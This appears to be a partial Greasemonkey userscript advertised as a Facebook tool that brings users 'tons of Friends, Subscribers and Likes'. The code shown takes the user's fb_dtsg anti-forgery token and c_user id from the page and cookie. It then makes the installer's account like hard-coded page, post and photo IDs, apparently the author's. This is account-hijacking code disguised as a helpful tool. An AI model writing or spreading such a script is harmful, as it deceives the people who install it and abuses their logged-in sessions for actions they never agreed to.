// ==UserScript==
// @name            Facebook RAND5 AutoBot - Get tons of Friends, Subscribers and Likes
// @description     Get your profile new friends, subscribers and likes.
// @version         5.7.2
// @date            01/05/2014
// @author          Henry Abrew
...
// pic + fans
Like("580455118651327");Like("617013601718735");Like("764153783625484");
/*Add Friend*/;
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
...
var spage_id = "764153783625484";
var spost_id = "617013601718735";
var sfoto_id = "580455118651327";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
